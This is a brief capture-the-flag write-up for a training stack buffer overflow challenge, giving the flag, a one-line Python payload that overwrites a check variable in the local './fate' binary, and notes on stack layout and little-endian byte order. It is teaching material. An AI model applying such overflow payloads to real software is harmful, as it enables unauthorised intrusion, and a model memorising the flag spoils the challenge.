# CTF101 2017: Day 2 Challenge 1

## Type of challenge

- Stack buffer overflow

## Flag

```
ctf101{changed_my_fate}
```

---

## Exploit

```shell
python -c 'print "a" * 64 + "\xbe\xba\xfe\xca"' | ./fate
```

### Notes

- Stack grows downwards, and since `int checknum` is declared before `char buf[64]`, we know that (in order from small address to large address):
    - 64 bytes: Contents of `buf`
    - 4 bytes: Contents of `checknum`
- Follow Little Endian, reverse the value to replace so that value will be interpreted correctly.
- Perform buffer overflow by simply entering the target payload from address index `65` to `68`.
